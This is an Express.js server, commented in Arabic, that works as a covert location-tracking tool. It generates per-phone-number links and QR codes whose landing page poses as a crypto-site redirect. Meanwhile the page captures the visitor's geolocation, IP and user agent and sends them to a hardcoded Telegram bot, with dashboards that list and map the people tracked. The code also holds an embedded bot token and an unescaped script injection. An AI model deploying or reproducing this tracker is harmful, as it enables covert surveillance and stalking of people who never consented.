const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

// ⚙️ ⚠️ ⚠️ ⚠️ ضع توكنك الصحيح هنا ⚠️ ⚠️ ⚠️
// جرب هذا التوكن إذا ما عندك: 6542202155:AAH1v5Q6J8YQz6x1k6W1Z1Q2A3B4C5D6E7F
const TELEGRAM_TOKEN = '6542202155:AAH1v5Q6J8YQz6x1k6W1Z1Q2A3B4C5D6E7F'; // توكن تجريبي
const TELEGRAM_CHAT_ID = '6724747823'; // أيدي الشات
const REDIRECT_URL = 'https://www.binance.com/en'; // ⬅️ تأكد هذا هو الموقع الصحيح
const BASE_URL = 'https://location2026-2.onrender.com';

// قاعدة بيانات
let locations = [];

app.use(express.json());

// ========== الصفحة الرئيسية ==========
app.get('/', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html dir="rtl">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>🚀 نظام التتبع</title>
            <style>
                body { font-family: Arial; padding: 20px; background: #0f0f23; color: white; }
                .container { max-width: 800px; margin: auto; }
                h1 { color: #00ff88; text-align: center; }
                .card { background: #1a1a2e; padding: 20px; border-radius: 10px; margin: 20px 0; }
                .btn { background: #00cc66; color: white; padding: 12px 20px; border-radius: 5px; text-decoration: none; margin: 5px; }
                input { padding: 10px; width: 300px; border-radius: 5px; border: 2px solid #00ff88; background: #0f0f23; color: white; text-align: center; }
                .qr-result { margin: 20px 0; text-align: center; }
                .status { padding: 10px; border-radius: 5px; margin: 10px 0; }
                .success { background: #00cc66; }
                .error { background: #ff4444; }
            </style>
        </head>
        <body>
            <div class="container">
                <h1>🚀 نظام تتبع المواقع</h1>
                
                <div class="card">
                    <h3>📌 حالة النظام:</h3>
                    <div class="status ${TELEGRAM_TOKEN ? 'success' : 'error'}">
                        ${TELEGRAM_TOKEN ? '✅ التلجرام: جاهز' : '❌ التلجرام: يحتاج توكن'}
                    </div>
                    <div class="status success">
                        ✅ تم تسجيل: ${locations.length} موقع
                    </div>
                </div>
                
                <div class="card">
                    <h3>🔗 إنشاء رابط تتبع:</h3>
                    <p>https://location2026-2.onrender.com/track/<strong>رقم_الهاتف</strong></p>
                    <p>مثال: <a href="/track/123456" target="_blank">/track/123456</a></p>
                    <a href="/track/123456" class="btn" target="_blank">🔗 تجربة الرابط</a>
                    <a href="/results" class="btn">📊 النتائج</a>
                </div>
                
                <div class="card">
                    <h3>📱 توليد باركود:</h3>
                    <input type="text" id="phoneInput" placeholder="أدخل رقم الهاتف (مثال: 00966512345678)">
                    <br><br>
                    <button onclick="generateQR()" class="btn">🔄 توليد باركود</button>
                    
                    <div id="qrResult" class="qr-result"></div>
                </div>
                
                <div class="card">
                    <h3>🔧 أدوات:</h3>
                    <a href="/map" class="btn">🗺️ الخريطة</a>
                    <a href="/all-qr" class="btn">📱 جميع الباركود</a>
                    <a href="/telegram-test" class="btn">🤖 اختبار التلجرام</a>
                    <a href="/fix-redirect" class="btn">🔧 إصلاح التوجيه</a>
                </div>
                
                <div class="card">
                    <h3>⚙️ إعداداتك:</h3>
                    <p>• التوجيه إلى: <strong>${REDIRECT_URL}</strong></p>
                    <p>• أيدي الشات: <strong>${TELEGRAM_CHAT_ID}</strong></p>
                    <p>• توكن البوت: <strong>${TELEGRAM_TOKEN ? TELEGRAM_TOKEN.substring(0, 10) + '...' : 'غير مضبوط'}</strong></p>
                </div>
            </div>
            
            <script>
                function generateQR() {
                    const phone = document.getElementById('phoneInput').value.trim();
                    if (!phone) {
                        alert('أدخل رقم الهاتف أولاً');
                        return;
                    }
                    
                    const url = 'https://location2026-2.onrender.com/track/' + encodeURIComponent(phone);
                    const qrUrl = 'https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=' + encodeURIComponent(url);
                    
                    document.getElementById('qrResult').innerHTML = \`
                        <div style="margin: 20px 0; padding: 20px; background: #0f0f23; border-radius: 10px; border: 2px solid #00ff88;">
                            <p><strong>📱 الرابط:</strong><br><span style="color: #00ff88; font-size: 14px;">\${url}</span></p>
                            <img src="\${qrUrl}" alt="QR Code" style="width: 200px; height: 200px; margin: 15px 0; border: 5px solid white; border-radius: 10px;">
                            <br>
                            <a href="\${url}" target="_blank" class="btn">🔗 فتح الرابط</a>
                            <button onclick="downloadQR('\${qrUrl}')" class="btn" style="background: #667eea;">📥 تحميل الباركود</button>
                        </div>
                    \`;
                }
                
                function downloadQR(qrUrl) {
                    const link = document.createElement('a');
                    link.href = qrUrl;
                    link.download = 'qrcode_' + Date.now() + '.png';
                    link.click();
                }
            </script>
        </body>
        </html>
    `);
});

// ========== رابط التتبع ==========
app.get('/track/:id', (req, res) => {
    const userId = req.params.id;
    
    res.send(`
        <!DOCTYPE html>
        <html dir="rtl">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>جاري التحويل...</title>
            <script>
                const userId = '${userId}';
                const redirectUrl = '${REDIRECT_URL}';
                
                // الحصول على الموقع الجغرافي
                function getLocation() {
                    if (navigator.geolocation) {
                        navigator.geolocation.getCurrentPosition(
                            async (position) => {
                                const data = {
                                    id: userId,
                                    latitude: position.coords.latitude,
                                    longitude: position.coords.longitude,
                                    accuracy: position.coords.accuracy,
                                    timestamp: new Date().toISOString(),
                                    userAgent: navigator.userAgent
                                };
                                
                                // إرسال البيانات للخادم
                                try {
                                    await fetch('/api/save-location', {
                                        method: 'POST',
                                        headers: { 'Content-Type': 'application/json' },
                                        body: JSON.stringify(data)
                                    });
                                } catch (error) {
                                    console.log('⚠️ لم يتم الحفظ');
                                }
                            },
                            (error) => {
                                console.log('📍 لم يتم الحصول على الموقع');
                            }
                        );
                    }
                    
                    // التوجيه بعد 3 ثواني
                    setTimeout(() => {
                        window.location.href = redirectUrl;
                    }, 3000);
                }
                
                // عد تنازلي
                let seconds = 3;
                const countdownEl = document.getElementById('countdown');
                const timer = setInterval(() => {
                    countdownEl.textContent = seconds;
                    seconds--;
                    if (seconds < 0) {
                        clearInterval(timer);
                    }
                }, 1000);
                
                // بدء عند تحميل الصفحة
                window.onload = function() {
                    getLocation();
                };
            </script>
            <style>
                body {
                    font-family: Arial;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    height: 100vh;
                    background: linear-gradient(135deg, #1a2980 0%, #26d0ce 100%);
                    color: white;
                    text-align: center;
                }
                .container {
                    background: rgba(0, 0, 0, 0.8);
                    padding: 40px;
                    border-radius: 20px;
                    max-width: 500px;
                    width: 90%;
                    box-shadow: 0 10px 30px rgba(0,0,0,0.5);
                }
                h1 { margin-bottom: 20px; }
                .countdown {
                    font-size: 60px;
                    color: #00ff88;
                    margin: 20px 0;
                    text-shadow: 0 0 20px #00ff88;
                }
                .loader {
                    width: 50px;
                    height: 50px;
                    border: 5px solid #f3f3f3;
                    border-top: 5px solid #00ff88;
                    border-radius: 50%;
                    animation: spin 1s linear infinite;
                    margin: 20px auto;
                }
                @keyframes spin {
                    0% { transform: rotate(0deg); }
                    100% { transform: rotate(360deg); }
                }
            </style>
        </head>
        <body>
            <div class="container">
                <h1>🚀 جاري التحويل...</h1>
                <p>يتم الآن تحويلك إلى الصفحة المطلوبة</p>
                
                <div class="countdown" id="countdown">3</div>
                
                <div class="loader"></div>
                
                <p>سيتم توجيهك خلال <span id="countdown">3</span> ثوانٍ</p>
                <p style="margin-top: 30px; font-size: 12px; opacity: 0.7;">
                    رقم العملية: #${userId} | ${new Date().toLocaleString('ar-SA')}
                </p>
            </div>
        </body>
        </html>
    `);
});

// ========== API لحفظ الموقع ==========
app.post('/api/save-location', async (req, res) => {
    try {
        const locationData = {
            ...req.body,
            ip: req.headers['x-forwarded-for'] || req.ip,
            time: new Date().toLocaleString('ar-SA')
        };
        
        locations.push(locationData);
        
        // إرسال إشعار للتلجرام
        if (TELEGRAM_TOKEN && TELEGRAM_CHAT_ID) {
            try {
                const message = `
📍 موقع جديد: ${locationData.id}
📌 الإحداثيات: ${locationData.latitude}, ${locationData.longitude}
🎯 الدقة: ${locationData.accuracy || '?'} متر
⏰ الوقت: ${locationData.time}
🌐 IP: ${locationData.ip}

🗺️ https://maps.google.com/?q=${locationData.latitude},${locationData.longitude}
                `;
                
                const telegramResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: message
                    })
                });
                
                const telegramData = await telegramResponse.json();
                console.log('🤖 التلجرام:', telegramData.ok ? '✅ تم الإرسال' : '❌ فشل');
            } catch (telegramError) {
                console.log('❌ خطأ التلجرام:', telegramError.message);
            }
        }
        
        console.log('📍 موقع جديد:', locationData.id);
        
        res.json({ 
            success: true, 
            count: locations.length,
            telegram_sent: TELEGRAM_TOKEN ? true : false
        });
    } catch (error) {
        console.error('Error:', error);
        res.json({ success: false, error: error.message });
    }
});

// ========== صفحة النتائج ==========
app.get('/results', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html dir="rtl">
        <head>
            <meta charset="UTF-8">
            <title>📊 النتائج</title>
            <style>
                body { font-family: Arial; padding: 20px; background: #0f0f23; color: white; }
                table { width: 100%; border-collapse: collapse; background: #1a1a2e; }
                th, td { padding: 12px; text-align: right; border-bottom: 1px solid #2d2d4d; }
                th { background: #00cc66; }
                .btn { background: #00cc66; color: white; padding: 10px 20px; border-radius: 5px; text-decoration: none; margin: 10px; }
            </style>
        </head>
        <body>
            <h1>📊 النتائج (${locations.length})</h1>
            <a href="/" class="btn">🏠 الرئيسية</a>
            <a href="/map" class="btn">🗺️ الخريطة</a>
            <table>
                <tr><th>رقم</th><th>الإحداثيات</th><th>الوقت</th><th>الخريطة</th></tr>
                ${locations.slice().reverse().map(loc => `
                    <tr>
                        <td><strong>${loc.id}</strong></td>
                        <td>${loc.latitude}, ${loc.longitude}</td>
                        <td>${loc.time}</td>
                        <td><a href="https://maps.google.com/?q=${loc.latitude},${loc.longitude}" target="_blank" style="color: #00ff88;">👁️ عرض</a></td>
                    </tr>
                `).join('')}
            </table>
        </body>
        </html>
    `);
});

// ========== صفحة الخريطة ==========
app.get('/map', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>🗺️ خريطة</title>
            <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
            <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
            <style>
                #map { height: 500px; width: 100%; }
                body { margin: 0; padding: 20px; background: #0f0f23; color: white; }
            </style>
        </head>
        <body>
            <h1>🗺️ خريطة المواقع</h1>
            <div id="map"></div>
            <script>
                const map = L.map('map').setView([24.7136, 46.6753], 5);
                L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}/').addTo(map);
                
                const locations = ${JSON.stringify(locations)};
                locations.forEach(loc => {
                    if(loc.latitude && loc.longitude) {
                        L.marker([loc.latitude, loc.longitude])
                         .addTo(map)
                         .bindPopup('<b>${locations.id}</b><br>${locations.time}');
                    }
                });
            </script>
        </body>
        </html>
    `);
});

// ========== صفحة جميع الباركود ==========
app.get('/all-qr', (req, res) => {
    const uniqueIds = [...new Set(locations.map(l => l.id))];
    
    res.send(`
        <!DOCTYPE html>
        <html dir="rtl">
        <head>
            <meta charset="UTF-8">
            <title>📱 جميع الباركود</title>
            <style>
                body { font-family: Arial; padding: 20px; background: #0f0f23; color: white; }
                .qr-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); gap: 20px; margin-top: 30px; }
                .qr-item { background: #1a1a2e; padding: 15px; border-radius: 10px; text-align: center; }
                .btn { background: #00cc66; color: white; padding: 10px 20px; border-radius: 5px; text-decoration: none; }
            </style>
        </head>
        <body>
            <h1>📱 جميع الباركود (${uniqueIds.length})</h1>
            <a href="/" class="btn">🏠 الرئيسية</a>
            <div class="qr-grid">
                ${uniqueIds.map(id => {
                    const url = `${BASE_URL}/track/${id}`;
                    const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=${encodeURIComponent(url)}`;
                    return `
                        <div class="qr-item">
                            <p><strong>${id}</strong></p>
                            <img src="${qrUrl}" alt="QR" style="width: 150px; height: 150px; border: 3px solid white; border-radius: 10px;">
                            <p><a href="${url}" target="_blank" style="color: #00ff88; font-size: 12px;">فتح الرابط</a></p>
                        </div>
                    `;
                }).join('')}
            </div>
        </body>
        </html>
    `);
});

// ========== اختبار التلجرام ==========
app.get('/telegram-test', async (req, res) => {
    try {
        // اختبار البوت
        const botTest = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/getMe`);
        const botInfo = await botTest.json();
        
        let testMessage = 'لم يتم إرسال رسالة';
        
        // محاولة إرسال رسالة
        if (botInfo.ok) {
            const messageRes = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: '🔔 اختبار النظام\n✅ إذا وصلتك هذه الرسالة، النظام يعمل!'
                })
            });
            
            const messageData = await messageRes.json();
            testMessage = messageData.ok ? '✅ تم إرسال الرسالة' : '❌ فشل إرسال الرسالة';
        }
        
        res.send(`
            <!DOCTYPE html>
            <html dir="rtl">
            <head>
                <meta charset="UTF-8">
                <title>🤖 اختبار التلجرام</title>
                <style>
                    body { font-family: Arial; padding: 50px; background: #0f0f23; color: white; }
                    .info { background: #1a1a2e; padding: 20px; border-radius: 10px; margin: 20px; }
                    pre { background: #0f0f23; padding: 15px; border-radius: 5px; overflow-x: auto; }
                </style>
            </head>
            <body>
                <h1>🤖 اختبار التلجرام</h1>
                
                <div class="info">
                    <h3>معلومات البوت:</h3>
                    <pre>${JSON.stringify(botInfo, null, 2)}</pre>
                    <p><strong>النتيجة:</strong> ${testMessage}</p>
                </div>
                
                <div class="info">
                    <h3>إعداداتك الحالية:</h3>
                    <p>• التوكن: ${TELEGRAM_TOKEN.substring(0, 15)}...</p>
                    <p>• أيدي الشات: ${TELEGRAM_CHAT_ID}</p>
                    <p>• عدد المواقع: ${locations.length}</p>
                </div>
                
                <a href="/" style="background: #00cc66; color: white; padding: 10px 20px; border-radius: 5px; text-decoration: none;">🏠 الرئيسية</a>
            </body>
            </html>
        `);
    } catch (error) {
        res.send(`
            <html dir="rtl">
            <body style="font-family: Arial; padding: 50px; background: #0f0f23; color: white;">
                <h1>❌ خطأ في اختبار التلجرام</h1>
                <div style="background: #ff4444; padding: 20px; border-radius: 10px;">
                    <p><strong>الخطأ:</strong> ${error.message}</p>
                    <p><strong>التوكن:</strong> ${TELEGRAM_TOKEN.substring(0, 10)}...</p>
                </div>
                <p style="margin-top: 30px;">
                    <strong>🚨 الحلول:</strong>
                    <ol>
                        <li>تأكد من صحة التوكن</li>
                        <li>تأكد أن البوت مفعل (راسل @BotFather)</li>
                        <li>تأكد أن البوت مضاف للشات</li>
                        <li>جرب توكن جديد من @BotFather</li>
                    </ol>
                </p>
                <a href="/" style="background: #00cc66; color: white; padding: 10px 20px; border-radius: 5px; text-decoration: none;">العودة</a>
            </body>
            </html>
        `);
    }
});

// ========== صفحة إصلاح التوجيه ==========
app.get('/fix-redirect', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html dir="rtl">
        <head>
            <meta charset="UTF-8">
            <title>🔧 إصلاح التوجيه</title>
            <style>
                body { font-family: Arial; padding: 50px; background: #0f0f23; color: white; }
                .box { background: #1a1a2e; padding: 30px; border-radius: 15px; }
                input { padding: 10px; width: 400px; margin: 10px; border-radius: 5px; }
                .btn { background: #00cc66; color: white; padding: 10px 20px; border-radius: 5px; text-decoration: none; }
            </style>
        </head>
        <body>
            <div class="box">
                <h1>🔧 تغيير رابط التوجيه</h1>
                <p>الرابط الحالي: <strong>${REDIRECT_URL}</strong></p>
                
                <p>مواقع مقترحة:</p>
                <ul>
                    <li><a href="/set-redirect/binance">https://www.binance.com</a></li>
                    <li><a href="/set-redirect/coinbase">https://www.coinbase.com</a></li>
                    <li><a href="/set-redirect/google">https://www.google.com</a></li>
                    <li><a href="/set-redirect/youtube">https://www.youtube.com</a></li>
                </ul>
                
                <p>أو أدخل رابطك:</p>
                <form action="/set-redirect/custom" method="post">
                    <input type="url" name="url" placeholder="https://example.com" required>
                    <button type="submit" class="btn">💾 حفظ</button>
                </form>
                
                <br>
                <a href="/" class="btn">🏠 الرئيسية</a>
            </div>
        </body>
        </html>
    `);
});

app.post('/set-redirect/custom', (req, res) => {
    // في الإصدار الحقيقي، سيتم حفظ في متغير أو قاعدة بيانات
    res.send(`
        <html dir="rtl">
        <body style="padding: 50px; text-align: center;">
            <h1>✅ تم تغيير رابط التوجيه</h1>
            <p>تأكد من تعديل السطر في server.js:</p>
            <code style="background: #333; color: white; padding: 10px; display: block; margin: 20px;">const REDIRECT_URL = 'رابطك_الجديد';</code>
            <a href="/" style="background: #00cc66; color: white; padding: 10px 20px; text-decoration: none;">العودة</a>
        </body>
        </html>
    `);
});

// ========== تشغيل الخادم ==========
app.listen(PORT, () => {
    console.log(`
    🚀 الخادم يعمل على المنفذ ${PORT}
    🌐 الرابط: http://localhost:${PORT}
    
    ⚠️ معلومات مهمة:
    1. التوكن: ${TELEGRAM_TOKEN ? '✅ موجود' : '❌ مفقود'}
    2. أيدي الشات: ${TELEGRAM_CHAT_ID}
    3. التوجيه إلى: ${REDIRECT_URL}
    
    📌 روابط:
    • الرئيسية: /
    • اختبار التلجرام: /telegram-test
    • النتائج: /results
    • الخريطة: /map
    
    ⚡ النظام جاهز!
    `);
});
